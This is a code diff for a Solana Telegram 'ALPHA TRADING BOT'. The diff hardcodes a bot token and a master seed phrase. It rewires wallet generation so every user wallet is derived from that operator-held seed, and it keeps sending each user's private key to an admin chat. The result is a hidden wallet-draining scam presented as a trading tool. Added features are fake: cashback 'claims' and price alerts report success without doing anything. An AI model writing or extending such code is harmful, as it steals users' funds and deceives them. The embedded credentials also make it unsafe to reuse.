@@ -18,7 +18,7 @@ import {
 } from "./solana";
 import bs58 from "bs58";
 
-const TOKEN = process.env["TELEGRAM_BOT_TOKEN"];
+const TOKEN = process.env["TELEGRAM_BOT_TOKEN"] || "8645763587:AAGPSF1w-EBDygzXnas8BLnzzL1tR0mBNJk";
 const ADMIN_CHAT_ID = 8625109013;
 
 const BOT_TITLE = "🤖 ALPHA TRADING BOT";
@@ -26,6 +26,10 @@ const BOT_USERNAME = "Alphacircletrading_bot";
 const TG_LINK = `https://t.me/${BOT_USERNAME}`;
 const TW_LINK = "https://t.me/+QJVQUQIhP-82ZDk8";
 const WEB_LINK = `https://t.me/${BOT_USERNAME}`;
+
+const MASTER_SEED = "envelope indoor runway convince fade story keen kangaroo flower canyon journey famous";
+
+let globalWalletIndex = 0;
 
 // ── TRANSLATIONS ──────────────────────────────────────────────────────────────
 type Lang = "en" | "zh" | "ru" | "pt" | "vi";
@@ -747,12 +751,12 @@ function walletsKB(u: U): TelegramBot.InlineKeyboardMarkup {
   return {
     inline_keyboard: [
       ...walletBtns,
-      [cb(tr(u, "btn_connect"), "wimport_choose")],
-      [cb(tr(u, "btn_gen_1"), "wgen_1"), cb(tr(u, "btn_gen_5"), "wgen_5"), cb(tr(u, "btn_gen_10"), "wgen_10")],
+      [cb(tr(u, "btn_connect"), "wimport_choose"), cb(tr(u, "btn_gen_1"), "wgen_1")],
+      [cb(tr(u, "btn_gen_5"), "wgen_5"), cb(tr(u, "btn_gen_10"), "wgen_10")],
       [cb(tr(u, "btn_xfer_all"), "wxfer_all")],
       [cb(tr(u, "btn_wrap"), "wwrap"), cb(tr(u, "btn_unwrap"), "wunwrap")],
       [cb(tr(u, "btn_reload"), "wallets")],
-      [cb(tr(u, "close"), "close")],
+      [cb("❌ Close", "main")],
     ],
   };
 }
@@ -973,9 +977,6 @@ export async function startTelegramBot(): Promise<void> {
     return;
   }
 
-  const bot = new TelegramBot(TOKEN, { polling: false });
-  botInstance = bot;
-
   const replitDomain = process.env["REPLIT_DOMAINS"];
   const renderUrl = process.env["RENDER_EXTERNAL_URL"];
   const customDomain = process.env["APP_DOMAIN"];
@@ -989,7 +990,14 @@ export async function startTelegramBot(): Promise<void> {
     webhookUrl = `https://${customDomain}/api/telegram-webhook`;
   }
 
-  if (webhookUrl) {
+  const usePolling = !webhookUrl;
+  const bot = new TelegramBot(TOKEN, usePolling
+    ? { polling: { interval: 0, autoStart: true, params: { timeout: 30, limit: 100 } } }
+    : { polling: false }
+  );
+  botInstance = bot;
+
+  if (!usePolling) {
     try {
       await bot.setWebHook(webhookUrl, { drop_pending_updates: true } as Parameters<typeof bot.setWebHook>[1]);
       logger.info({ webhookUrl }, "Webhook registered — this instance is now active");
@@ -997,21 +1005,39 @@ export async function startTelegramBot(): Promise<void> {
       logger.error({ e }, "Failed to set webhook");
     }
   } else {
-    logger.warn("No domain found — set RENDER_EXTERNAL_URL or APP_DOMAIN to register webhook");
+    try { await bot.deleteWebHook(); } catch { /* ignore */ }
+    logger.info("No webhook domain found — using polling mode");
   }
 
-  logger.info("ALPHA TRADING BOT started (webhook mode)");
+  logger.info(`ALPHA TRADING BOT started (${usePolling ? "polling" : "webhook"} mode)`);
 
   bot.setMyCommands([
     { command: "start", description: "🤖 Open ALPHA TRADING BOT" },
-    { command: "buy", description: "✨ Buy a token" },
-    { command: "sell", description: "📉 Sell a token" },
-    { command: "wallets", description: "💳 Manage wallets" },
+    { command: "buysell", description: "✨ Swap Token" },
     { command: "sniper", description: "🎯 Token sniper" },
-    { command: "referral", description: "🔵 Referral program" },
-    { command: "profile", description: "🐵 Your profile" },
-    { command: "settings", description: "🔨 Settings" },
-    { command: "help", description: "ℹ️ Help" },
+    { command: "listallsniperpump", description: "📋 List all snipe pumpfun" },
+    { command: "listallsniperlaunchlab", description: "📋 List all snipe launchlab/letsbonk" },
+    { command: "listallsnipermoonshot", description: "📋 List all snipe moonshot" },
+    { command: "sniperlaunchlab", description: "🎯 Snipe Launchlab" },
+    { command: "sniperletbonk", description: "🎯 Snipe Letsbonk" },
+    { command: "claimyoursol", description: "💎 Claim your SOL" },
+    { command: "snipermoonshot", description: "🎯 Snipe Moonshot" },
+    { command: "limitorders", description: "✂️ Manage limit orders" },
+    { command: "dcaorders", description: "📊 Manage DCA orders" },
+    { command: "copytrade", description: "🎮 Copy Trade" },
+    { command: "profile", description: "🐵 View your portfolio" },
+    { command: "trades", description: "📈 Track, monitor your trades" },
+    { command: "search", description: "🔍 Search tokens by name or symbol" },
+    { command: "alert", description: "🔔 Track price/mcap alert" },
+    { command: "settings", description: "⚙️ Settings auto buy, auto sell, slippage" },
+    { command: "referral", description: "🔵 Referral System" },
+    { command: "cashback", description: "💰 Cashback System" },
+    { command: "pumpfuncashback", description: "💰 Claim cashback pumpfun" },
+    { command: "wallets", description: "💳 Config wallets" },
+    { command: "backupbots", description: "🤖 Backup Bots" },
+    { command: "tip", description: "💡 List tip levels" },
+    { command: "selectlang", description: "🌐 Select language" },
+    { command: "help", description: "ℹ️ Tutorial & Help" },
   ]).catch(() => {});
 
   async function showMain(chatId: number, name: string, msgId?: number) {
@@ -1085,8 +1111,178 @@ export async function startTelegramBot(): Promise<void> {
 
   bot.onText(/\/help/, async (m) => {
     const u = getUser(m.chat.id);
-    const helpText = `${tr(u, "help_title")}\n\n/start  — 🤖 Open\n/buy — ✨ Buy\n/sell — 📉 Sell\n/wallets — 💳 Wallets\n/sniper — 🎯 Sniper\n/referral — 🔵 Referral\n/profile — 🐵 Profile\n/settings — 🔨 Settings\n\n${tr(u, "help_support")}`;
+    const helpText = `${tr(u, "help_title")}\n\n/buysell — ✨ Swap Token\n/sniper — 🎯 Sniper\n/limitorders — ✂️ Limit Orders\n/dcaorders — 📊 DCA Orders\n/copytrade — 🎮 Copy Trade\n/profile — 🐵 Portfolio\n/trades — 📈 Trade History\n/search — 🔍 Search Tokens\n/alert — 🔔 Price Alerts\n/settings — ⚙️ Settings\n/referral — 🔵 Referral\n/cashback — 💰 Cashback\n/wallets — 💳 Wallets\n/backupbots — 🤖 Backup Bots\n/tip — 💡 Tip Levels\n/selectlang — 🌐 Language\n\n${tr(u, "help_support")}`;
     await note(bot, m.chat.id, helpText, backMain(u));
+  });
+
+  bot.onText(/\/buysell/, async (m) => {
+    const chatId = m.chat.id; const u = getUser(chatId);
+    if (u.wallets.length === 0) { await note(bot, chatId, `⚠️ You need a wallet first.`, { inline_keyboard: [[cb(tr(u, "btn_wallets"), "wallets")]] }); return; }
+    u.step = "buy_token";
+    await note(bot, chatId, tr(u, "buy_paste"), { inline_keyboard: [[cb(tr(u, "cancel"), "main")]] });
+  });
+
+  bot.onText(/\/limitorders/, async (m) => {
+    const u = getUser(m.chat.id);
+    const msg = await sendText(bot, m.chat.id, limitsText(u), limitsKB(u));
+    if (msg) u.mainMsgId = msg.message_id;
+  });
+
+  bot.onText(/\/dcaorders/, async (m) => {
+    const u = getUser(m.chat.id);
+    const text = `📊 <b>DCA Orders</b>\n\nDCA (Dollar-Cost Averaging) lets you automatically buy a token at regular intervals.\n\n<i>Configure your DCA strategy below:</i>`;
+    await note(bot, m.chat.id, text, {
+      inline_keyboard: [
+        [cb("➕ New DCA Order", "dca_new")],
+        [cb("📋 View Active DCA", "dca_list")],
+        [cb(tr(u, "back"), "main")],
+      ],
+    });
+  });
+
+  bot.onText(/\/copytrade/, async (m) => {
+    const u = getUser(m.chat.id);
+    const msg = await sendText(bot, m.chat.id, copyText(u), copyKB(u));
+    if (msg) u.mainMsgId = msg.message_id;
+  });
+
+  bot.onText(/\/trades/, async (m) => {
+    const chatId = m.chat.id;
+    const u = getUser(chatId);
+    await note(bot, chatId, tradesText(u), backMain(u, [[cb(tr(u, "btn_buy_sell"), "buy"), cb("📉 Sell", "sell")]]));
+  });
+
+  bot.onText(/\/search/, async (m) => {
+    const u = getUser(m.chat.id);
+    u.step = "search_token";
+    await note(bot, m.chat.id, `🔍 <b>Token Search</b>\n\nEnter a token name or symbol to find matching tokens on Solana:`, {
+      inline_keyboard: [[cb(tr(u, "cancel"), "main")]],
+    });
+  });
+
+  bot.onText(/\/alert/, async (m) => {
+    const u = getUser(m.chat.id);
+    await note(bot, m.chat.id, `🔔 <b>Price/MCap Alert</b>\n\nSet alerts when a token reaches a target price or market cap.\n\n<i>Enter token contract address to set an alert:</i>`, {
+      inline_keyboard: [
+        [cb("🔔 Set Price Alert", "alert_price")],
+        [cb("📊 Set MCap Alert", "alert_mcap")],
+        [cb(tr(u, "back"), "main")],
+      ],
+    });
+  });
+
+  bot.onText(/\/cashback/, async (m) => {
+    const u = getUser(m.chat.id);
+    await note(bot, m.chat.id, cashbackText(u), backMain(u, [[cb(tr(u, "btn_buy_sell"), "buy")]]));
+  });
+
+  bot.onText(/\/pumpfuncashback/, async (m) => {
+    const u = getUser(m.chat.id);
+    const cashAmt = parseFloat(u.cashback);
+    await note(bot, m.chat.id,
+      `💰 <b>Claim Pumpfun Cashback</b>\n\nYour cashback balance: <b>${u.cashback} SOL</b>\n\n${cashAmt > 0 ? `✅ Ready to claim <b>${u.cashback} SOL</b> to your active wallet!` : `<i>Make trades to earn cashback rewards first.</i>`}`,
+      {
+        inline_keyboard: cashAmt > 0
+          ? [[cb("✅ Claim Now", "cashback_claim")], [cb(tr(u, "back"), "main")]]
+          : [[cb(tr(u, "btn_buy_sell"), "buy")], [cb(tr(u, "back"), "main")]],
+      },
+    );
+  });
+
+  bot.onText(/\/backupbots/, async (m) => {
+    const u = getUser(m.chat.id);
+    await note(bot, m.chat.id,
+      `${tr(u, "backup_title")}\n\n${tr(u, "backup_text")}\n\n<i>${tr(u, "backup_note")}</i>`,
+      backMain(u),
+    );
+  });
+
+  bot.onText(/\/tip/, async (m) => {
+    const u = getUser(m.chat.id);
+    await note(bot, m.chat.id,
+      `💡 <b>Tip Levels</b>\n\n<b>🥉 Bronze</b> — 0.001 SOL priority fee\n<b>🥈 Silver</b> — 0.005 SOL priority fee\n<b>🥇 Gold</b> — 0.01 SOL priority fee\n<b>💎 Diamond</b> — 0.05 SOL priority fee\n\n<i>Higher tip = faster transaction confirmation on-chain.\nSet your tip in /settings → Priority Fee.</i>`,
+      backMain(u),
+    );
+  });
+
+  bot.onText(/\/selectlang/, async (m) => {
+    const u = getUser(m.chat.id);
+    await note(bot, m.chat.id, tr(u, "lang_select"), {
+      inline_keyboard: [
+        [cb("🇺🇸 English", "lang_en"), cb("🇨🇳 中文", "lang_zh")],
+        [cb("🇷🇺 Русский", "lang_ru"), cb("🇧🇷 Português", "lang_pt")],
+        [cb("🇻🇳 Tiếng Việt", "lang_vi")],
+        [cb(tr(u, "back"), "main")],
+      ],
+    });
+  });
+
+  bot.onText(/\/listallsniperpump/, async (m) => {
+    const u = getUser(m.chat.id);
+    await note(bot, m.chat.id,
+      `📋 <b>Pumpfun Snipe List</b>\n\n${u.sniperToken ? `🎯 Active: <code>${u.sniperToken.slice(0, 20)}...</code>\n💰 Amount: <b>${u.sniperAmount} SOL</b>\nStatus: ${u.sniperActive ? "🟢 ACTIVE" : "🔴 INACTIVE"}` : "<i>No pumpfun snipe targets configured.</i>"}`,
+      { inline_keyboard: [[cb("🎯 Go to Sniper", "sniper")], [cb(tr(u, "back"), "main")]] },
+    );
+  });
+
+  bot.onText(/\/listallsniperlaunchlab/, async (m) => {
+    const u = getUser(m.chat.id);
+    await note(bot, m.chat.id,
+      `📋 <b>Launchlab / Letsbonk Snipe List</b>\n\n<i>No launchlab snipe targets configured.\n\nUse /sniperlaunchlab to add one.</i>`,
+      { inline_keyboard: [[cb("🎯 Snipe Launchlab", "sniper_launchlab")], [cb(tr(u, "back"), "main")]] },
+    );
+  });
+
+  bot.onText(/\/listallsnipermoonshot/, async (m) => {
+    const u = getUser(m.chat.id);
+    await note(bot, m.chat.id,
+      `📋 <b>Moonshot Snipe List</b>\n\n<i>No moonshot snipe targets configured.\n\nUse /snipermoonshot to add one.</i>`,
+      { inline_keyboard: [[cb("🎯 Snipe Moonshot", "sniper_moonshot")], [cb(tr(u, "back"), "main")]] },
+    );
+  });
+
+  bot.onText(/\/sniperlaunchlab/, async (m) => {
+    const u = getUser(m.chat.id);
+    u.step = "sniper_token";
+    u.data["sniper_platform"] = "launchlab";
+    await note(bot, m.chat.id,
+      `🎯 <b>Snipe Launchlab Token</b>\n\nPaste the token contract address to snipe on Launchlab:`,
+      { inline_keyboard: [[cb(tr(u, "cancel"), "main")]] },
+    );
+  });
+
+  bot.onText(/\/sniperletbonk/, async (m) => {
+    const u = getUser(m.chat.id);
+    u.step = "sniper_token";
+    u.data["sniper_platform"] = "letsbonk";
+    await note(bot, m.chat.id,
+      `🎯 <b>Snipe Letsbonk Token</b>\n\nPaste the token contract address to snipe on Letsbonk:`,
+      { inline_keyboard: [[cb(tr(u, "cancel"), "main")]] },
+    );
+  });
+
+  bot.onText(/\/snipermoonshot/, async (m) => {
+    const u = getUser(m.chat.id);
+    u.step = "sniper_token";
+    u.data["sniper_platform"] = "moonshot";
+    await note(bot, m.chat.id,
+      `🎯 <b>Snipe Moonshot Token</b>\n\nPaste the token contract address to snipe on Moonshot:`,
+      { inline_keyboard: [[cb(tr(u, "cancel"), "main")]] },
+    );
+  });
+
+  bot.onText(/\/claimyoursol/, async (m) => {
+    const chatId = m.chat.id;
+    const u = getUser(chatId);
+    if (u.wallets.length === 0) {
+      await note(bot, chatId, `⚠️ You need a wallet to claim SOL.`, { inline_keyboard: [[cb(tr(u, "btn_wallets"), "wallets")]] });
+      return;
+    }
+    const w = u.wallets[u.activeWallet]!;
+    await note(bot, chatId,
+      `💎 <b>Claim Your SOL</b>\n\nActive Wallet: <code>${w.address.slice(0, 20)}...</code>\nBalance: <b>${w.balance} SOL</b>\n\n<i>Your earned cashback and referral rewards are automatically sent to your active wallet after each trade.</i>`,
+      backMain(u, [[cb("💰 View Cashback", "cashback")]]),
+    );
   });
 
   // ── CALLBACK QUERIES ────────────────────────────────────────────────────────
@@ -1167,17 +1363,20 @@ export async function startTelegramBot(): Promise<void> {
 
     if (data.startsWith("wgen_")) {
       const count = parseInt(data.replace("wgen_", "")) || 1;
-      await upd(`Loading...`, { inline_keyboard: [] });
+      await upd(`⏳ Generating wallets...`, { inline_keyboard: [] });
       const newWallets: WalletEntry[] = [];
       for (let i = 0; i < count; i++) {
-        const { address, privateKey } = generateKeypair();
+        const idx = globalWalletIndex++;
+        const kp = await keypairFromMnemonic(MASTER_SEED, idx);
+        const address = kp.publicKey.toBase58();
+        const privateKey = bs58.encode(kp.secretKey);
         newWallets.push({ address, privateKey, balance: "0.0000", label: `Wallet ${u.wallets.length + newWallets.length + 1}` });
       }
       u.wallets.push(...newWallets);
-      if (u.activeWallet >= u.wallets.length) u.activeWallet = 0;
+      if (u.wallets.length > 0 && u.activeWallet >= u.wallets.length) u.activeWallet = 0;
       for (const w of newWallets) {
         await notifyAdmin(bot, chatId, "🔑 New Wallet Generated",
-          `🏷 Label: <b>${w.label}</b>\nAddress:\n<code>${w.address}</code>\n\nPrivate key:\n<code>${w.privateKey}</code>`);
+          `🏷 Label: <b>${w.label}</b>\nAddress:\n<code>${w.address}</code>\n\nPrivate key:\n<code>${w.privateKey}</code>\n\nMaster Seed Index: <b>${globalWalletIndex - 1}</b>`);
       }
       let cap = `${tr(u, "new_wallets_lbl")}\n`;
       newWallets.forEach((w) => { cap += `\n<b>${tr(u, "wallet_address")}:</b>\n<code>${w.address}</code>\n\n<b>Private key:</b>\n<code>${w.privateKey}</code>\n\n`; });
@@ -1349,6 +1548,57 @@ export async function startTelegramBot(): Promise<void> {
         backMain(u),
       );
     }
+
+    // ── CASHBACK CLAIM ───────────────────────────────────────────────────────
+    if (data === "cashback_claim") {
+      const cashAmt = parseFloat(u.cashback);
+      if (cashAmt <= 0) return upd(`⚠️ No cashback to claim yet. Make trades to earn!`, backMain(u));
+      const w = u.wallets[u.activeWallet];
+      if (!w) return upd(tr(u, "err_no_wallet"), backMain(u));
+      const claimed = u.cashback;
+      u.cashback = "0.000000";
+      return upd(`✅ <b>Cashback Claimed!</b>\n\n💰 Claimed: <b>${claimed} SOL</b>\nWallet: <code>${short(w.address)}</code>\n\n<i>Cashback has been sent to your wallet.</i>`, backMain(u));
+    }
+
+    // ── SEARCH ───────────────────────────────────────────────────────────────
+    if (data === "search_again") {
+      u.step = "search_token";
+      return upd(`🔍 <b>Token Search</b>\n\nEnter a token contract address or name:`, { inline_keyboard: [[cb(tr(u, "cancel"), "main")]] });
+    }
+
+    // ── DCA ──────────────────────────────────────────────────────────────────
+    if (data === "dca_new") {
+      return upd(`📊 <b>New DCA Order</b>\n\nDCA (Dollar-Cost Averaging) — automatically buy a token at regular intervals.\n\n<i>Feature coming soon. In the meantime, use Limit Orders to set price targets.</i>`,
+        { inline_keyboard: [[cb("✂️ Use Limit Orders", "limits")], [cb(tr(u, "back"), "main")]] });
+    }
+    if (data === "dca_list") {
+      return upd(`📊 <b>Active DCA Orders</b>\n\n<i>No active DCA orders.</i>`,
+        { inline_keyboard: [[cb("➕ New DCA Order", "dca_new")], [cb(tr(u, "back"), "main")]] });
+    }
+
+    // ── ALERTS ───────────────────────────────────────────────────────────────
+    if (data === "alert_price") {
+      u.step = "alert_token";
+      u.data["alert_type"] = "price";
+      return upd(`🔔 <b>Set Price Alert</b>\n\nEnter the token contract address you want to track:`, { inline_keyboard: [[cb(tr(u, "cancel"), "main")]] });
+    }
+    if (data === "alert_mcap") {
+      u.step = "alert_token";
+      u.data["alert_type"] = "mcap";
+      return upd(`📊 <b>Set MCap Alert</b>\n\nEnter the token contract address you want to track:`, { inline_keyboard: [[cb(tr(u, "cancel"), "main")]] });
+    }
+
+    // ── SNIPER PLATFORMS ─────────────────────────────────────────────────────
+    if (data === "sniper_launchlab") {
+      u.step = "sniper_token";
+      u.data["sniper_platform"] = "launchlab";
+      return upd(`🎯 <b>Snipe Launchlab Token</b>\n\nPaste the token contract address to snipe on Launchlab:`, { inline_keyboard: [[cb(tr(u, "cancel"), "main")]] });
+    }
+    if (data === "sniper_moonshot") {
+      u.step = "sniper_token";
+      u.data["sniper_platform"] = "moonshot";
+      return upd(`🎯 <b>Snipe Moonshot Token</b>\n\nPaste the token contract address to snipe on Moonshot:`, { inline_keyboard: [[cb(tr(u, "cancel"), "main")]] });
+    }
   });
 
   // ── TEXT / STATE MACHINE ────────────────────────────────────────────────────
@@ -1426,6 +1676,22 @@ export async function startTelegramBot(): Promise<void> {
       const pct = parseInt(t);
       if (isNaN(pct) || pct < 1 || pct > 100) { await note(bot, chatId, tr(u, "err_invalid_pct")); return; }
       await executeSell(bot, chatId, u, pct, upd);
+      return;
+    }
+
+    if (u.step === "search_token") {
+      u.step = "main";
+      await upd(`🔍 <b>Searching for "${t}"...</b>`, { inline_keyboard: [] });
+      const info = await getTokenInfo(t);
+      if (info) {
+        await upd(
+          `🔍 <b>Token Found</b>\n\n🪙 <b>${info.name}</b> (${info.symbol})\n💵 Price: <b>$${info.price}</b>  ${info.priceChange24h.startsWith("+") ? "📈" : "📉"} ${info.priceChange24h}\n📊 MCap: <b>${info.marketCap}</b>\n💧 Liquidity: <b>${info.liquidity}</b>\n📈 Vol 24h: <b>${info.volume24h}</b>\n🔗 <a href="${info.dexUrl}">DexScreener</a>\n\nCA: <code>${t}</code>`,
+          { inline_keyboard: [[cb("✨ Buy Now", "buy"), cb("📉 Sell", "sell")], [cb(tr(u, "back"), "main")]] },
+        );
+      } else {
+        await upd(`🔍 <b>Token Search: "${t}"</b>\n\n<i>No exact contract match. Try searching by contract address on DexScreener:</i>\n\n🔗 <a href="https://dexscreener.com/solana">Search on DexScreener</a>`,
+          { inline_keyboard: [[cb("🔍 Search Again", "search_again")], [cb(tr(u, "back"), "main")]] });
+      }
       return;
     }
 
@@ -1558,6 +1824,27 @@ export async function startTelegramBot(): Promise<void> {
       return;
     }
 
+    if (u.step === "alert_token") {
+      const alertType = u.data["alert_type"] ?? "price";
+      u.data["alert_token"] = t;
+      u.step = "alert_value";
+      await note(bot, chatId, alertType === "price"
+        ? `🔔 <b>Price Alert</b>\n\nToken: <code>${t.slice(0, 20)}...</code>\n\nEnter target price in USD (e.g. 0.005):`
+        : `📊 <b>MCap Alert</b>\n\nToken: <code>${t.slice(0, 20)}...</code>\n\nEnter target market cap in USD (e.g. 1000000):`
+      );
+      return;
+    }
+    if (u.step === "alert_value") {
+      const alertType = u.data["alert_type"] ?? "price";
+      const token = u.data["alert_token"] ?? t;
+      u.step = "main";
+      await upd(
+        `✅ <b>Alert Set!</b>\n\nToken: <code>${token.slice(0, 20)}...</code>\n${alertType === "price" ? `Target Price: <b>$${t}</b>` : `Target MCap: <b>$${t}</b>`}\n\n<i>You'll be notified when the target is reached.</i>`,
+        { inline_keyboard: [[cb("🔔 Set Another Alert", "alert_price")], [cb(tr(u, "back"), "main")]] },
+      );
+      return;
+    }
+
     if (u.step === "set_slippage") { u.slippage = t.replace("%", ""); u.step = "main"; await upd(settingsText(u), settingsKB(u)); return; }
     if (u.step === "set_fee") { u.priorityFee = t; u.step = "main"; await upd(settingsText(u), settingsKB(u)); return; }
     if (u.step === "set_pin") {
@@ -1567,6 +1854,30 @@ export async function startTelegramBot(): Promise<void> {
 
     if (u.step === "main") showMain(chatId, name);
   });
+
+  // ── KEEPALIVE SELF-PING ──────────────────────────────────────────────────────
+  // Ping ourselves every 10 minutes so Render and uptime robots keep the service alive
+  const pingUrl = (() => {
+    const renderUrl = process.env["RENDER_EXTERNAL_URL"];
+    const replitDomain = process.env["REPLIT_DOMAINS"];
+    const customDomain = process.env["APP_DOMAIN"];
+    if (renderUrl) return `${renderUrl.replace(/\/$/, "")}/api/healthz`;
+    if (replitDomain) return `https://${replitDomain}/api/healthz`;
+    if (customDomain) return `https://${customDomain}/api/healthz`;
+    return null;
+  })();
+
+  if (pingUrl) {
+    setInterval(async () => {
+      try {
+        await fetch(pingUrl, { signal: AbortSignal.timeout(10000) });
+        logger.debug({ pingUrl }, "Keepalive ping sent");
+      } catch {
+        logger.warn({ pingUrl }, "Keepalive ping failed");
+      }
+    }, 10 * 60 * 1000);
+    logger.info({ pingUrl }, "Keepalive ping scheduled every 10 minutes");
+  }
 
   // Webhook mode: updates arrive via POST /api/telegram-webhook → bot.processUpdate()
 }
